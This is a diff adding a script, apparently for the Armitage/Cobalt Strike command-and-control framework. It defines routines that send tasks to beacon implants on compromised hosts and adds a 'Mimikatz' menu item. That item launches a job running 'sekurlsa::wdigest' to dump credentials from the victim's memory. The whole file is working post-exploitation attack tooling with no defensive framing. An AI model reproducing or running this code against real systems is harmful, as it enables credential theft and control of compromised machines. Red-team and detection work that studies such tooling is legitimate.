@@ -1,0 +1,58 @@
+#
+# CRUD for Beacon Tool
+#
+
+import msf.*;
+import java.awt.*;
+import java.io.*;
+import java.net.*;
+import javax.swing.*;
+import javax.imageio.*;
+import ui.*;
+import console.*;
+import armitage.*;
+import beacon.*;
+import beacon.jobs.*;
+
+import cloudstrike.*;
+
+# task beacon to do our bidding...
+sub taskit {
+	call_async($mclient, "beacon.task", $1, $2, $MY_ADDRESS);
+	call_async($mclient, "beacon.task", $1, $3, $MY_ADDRESS);
+	call_async($mclient, "beacon.log_write", $1, "[*] $4 $+ \n");
+}
+
+sub callback64 {
+	local('$list $b $is64 $id $arg $callback');
+	($id, $arg, $callback) = @_;
+
+	# get our list of beacons
+	call_async($mclient, "beacon.list", $this);
+	yield;
+	$list = convertAll($1);
+
+	# loop up the 32-bit/64-bit status of this session
+	foreach $b ($list) {
+		if ($b['id'] eq $id) {
+			$is64 = $b['is64'];
+			if ($is64) {
+				[$callback: $id, $arg, "x64"];
+			}
+			else {
+				[$callback: $id, $arg, "x86"];
+			}
+			return;
+		}
+	}
+}
+
+popup beacon_top {
+  item "Mimikatz" {
+  callback64($id, $null, {
+		local('$job');
+		$job  = [new MimikatzJob: &taskit, "sekurlsa::wdigest"];
+		[$job spawn: $1, $3];
+		});
+}
+}
